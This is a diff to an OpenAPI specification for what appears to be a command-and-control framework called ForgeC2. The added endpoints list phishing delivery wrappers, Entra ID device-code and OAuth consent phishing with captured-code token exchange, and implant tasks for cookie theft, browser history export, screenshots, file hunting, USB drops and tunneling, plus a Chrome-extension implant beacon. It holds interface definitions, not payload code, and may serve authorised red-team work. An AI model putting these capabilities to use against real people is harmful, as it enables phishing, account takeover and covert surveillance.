@@ -5384,6 +5384,96 @@ paths:
       responses:
         '200':
           description: OK
+  /generate/delivery:
+    post:
+      tags: [Generate]
+      summary: Build HTML smuggling, URL shortcut, LNK, or ISO wrapper
+      operationId: generateDelivery
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: Base64 delivery artifact
+  /api/identity/device-code:
+    post:
+      tags: [Campaigns]
+      summary: Start Entra ID OAuth device-code grant (lab client_id required)
+      operationId: identityDeviceCodeStart
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: user_code and verification URI
+  /api/identity/device-code/{id}/poll:
+    post:
+      tags: [Campaigns]
+      summary: Poll device-code token endpoint
+      operationId: identityDeviceCodePoll
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: IdP token JSON or pending error
+  /api/identity/consent:
+    post:
+      tags: [Campaigns]
+      summary: Build Entra ID OAuth consent (authorization-code) URL
+      operationId: identityConsentStart
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: authorize_url and state
+  /api/identity/consent/{id}:
+    get:
+      tags: [Campaigns]
+      summary: Consent session status (has_code)
+      operationId: identityConsentStatus
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: has_code flag
+  /api/identity/consent/{id}/exchange:
+    post:
+      tags: [Campaigns]
+      summary: Exchange captured authorization code for tokens
+      operationId: identityConsentExchange
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: IdP token JSON
+  /phishing/oauth/callback:
+    get:
+      tags: [Campaigns]
+      summary: Public OAuth redirect capture (no auth)
+      operationId: phishingOAuthCallback
+      parameters:
+        - name: code
+          in: query
+          schema: { type: string }
+        - name: state
+          in: query
+          schema: { type: string }
+      responses:
+        '200':
+          description: HTML captured page
 
   /api/generate/profile/import:
     post:
@@ -7087,6 +7177,261 @@ paths:
       responses:
         '200':
           description: OK
+  /agents/{id}/cookie_proxy:
+    get:
+      tags: [Agents]
+      summary: Isolated cookie HTTP proxy status
+      operationId: get_agents_id_cookie_proxy
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: running, port, cookie counts
+  /agents/{id}/cookie_proxy/start:
+    post:
+      tags: [Agents]
+      summary: Start 127.0.0.1 cookie-injecting HTTP proxy
+      operationId: post_agents_id_cookie_proxy_start
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: proxy host/port
+  /agents/{id}/cookie_proxy/stop:
+    post:
+      tags: [Agents]
+      summary: Stop cookie HTTP proxy
+      operationId: post_agents_id_cookie_proxy_stop
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: OK
+  /agents/{id}/cookie_proxy/jar:
+    get:
+      tags: [Agents]
+      summary: JSON cookie jar from last cookie_export
+      operationId: get_agents_id_cookie_proxy_jar
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: cookies array
+  /agents/{id}/cookie_proxy/netscape:
+    get:
+      tags: [Agents]
+      summary: Netscape cookies.txt download
+      operationId: get_agents_id_cookie_proxy_netscape
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: cookies.txt
+  /agents/{id}/sccm_recon:
+    post:
+      tags: [Agents]
+      summary: SCCM/MECM client recon (Windows)
+      operationId: post_agents_id_sccm_recon
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/entra_prt:
+    post:
+      tags: [Agents]
+      summary: Entra join/PRT recon (dsregcmd)
+      operationId: post_agents_id_entra_prt
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/file_hunt:
+    post:
+      tags: [Agents]
+      summary: Capped recursive file hunt (listing-first)
+      operationId: post_agents_id_file_hunt
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/screen_trigger/start:
+    post:
+      tags: [Agents]
+      summary: Start foreground-window screenshot trigger
+      operationId: post_agents_id_screen_trigger_start
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/screen_trigger/stop:
+    post:
+      tags: [Agents]
+      summary: Stop foreground-window screenshot trigger
+      operationId: post_agents_id_screen_trigger_stop
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/usb_enum:
+    post:
+      tags: [Agents]
+      summary: Enumerate volumes and removable drives
+      operationId: post_agents_id_usb_enum
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/usb_drop:
+    post:
+      tags: [Agents]
+      summary: Copy an operator-specified file onto a removable volume
+      operationId: post_agents_id_usb_drop
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/browser_history:
+    post:
+      tags: [Agents]
+      summary: Export Chromium/Firefox/Safari history (capped)
+      operationId: post_agents_id_browser_history
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/session_recon:
+    post:
+      tags: [Agents]
+      summary: Logged-on sessions, idle, active window
+      operationId: post_agents_id_session_recon
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
+  /agents/{id}/tun:
+    get:
+      tags: [Agents]
+      summary: TUN helper status
+      operationId: get_agents_id_tun
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: running, udp_port
+  /agents/{id}/tun/start:
+    post:
+      tags: [Agents]
+      summary: Start Linux TUN + teamserver UDP helper
+      operationId: post_agents_id_tun_start
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id and udp_port
+  /agents/{id}/tun/stop:
+    post:
+      tags: [Agents]
+      summary: Stop TUN helper and implant tun
+      operationId: post_agents_id_tun_stop
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: task_id
 
   /agents/{id}/download_url:
     post:
@@ -9061,6 +9406,39 @@ paths:
       responses:
         '200':
           description: OK
+  /api/chrome/beacon:
+    post:
+      tags: [Intel]
+      summary: Chrome extension agent check-in
+      description: Public (no session). Registers a chrome-tagged implant, accepts task results, returns pending chrome_* tasks. Optional X-ForgeC2-Chrome-Token when server.beacon_key is set.
+      operationId: post__api_chrome_beacon
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [uuid]
+              properties:
+                uuid: { type: string }
+                info:
+                  type: object
+                  additionalProperties: { type: string }
+                results:
+                  type: array
+                  items:
+                    type: object
+                    properties:
+                      task_id: { type: integer }
+                      type: { type: string }
+                      output: { type: string }
+                      error: { type: string }
+      responses:
+        '200':
+          description: Pending chrome tasks
+        '401':
+          description: Chrome token rejected
   /api/chrome/agents:
     get:
       tags: [Intel]
@@ -9071,6 +9449,22 @@ paths:
       responses:
         '200':
           description: OK
+  /forgec2-chrome-c2.zip:
+    get:
+      tags: [Intel]
+      summary: Download Chrome C2 extension zip (C2 origin substituted)
+      operationId: get_forgec2_chrome_c2_zip
+      security: []
+      responses:
+        '200':
+          description: Zip archive
+          content:
+            application/zip:
+              schema:
+                type: string
+                format: binary
+        '503':
+          description: Extension sources not found on disk
   /api/dashboard/os-distribution:
     get:
       tags: [Agents]
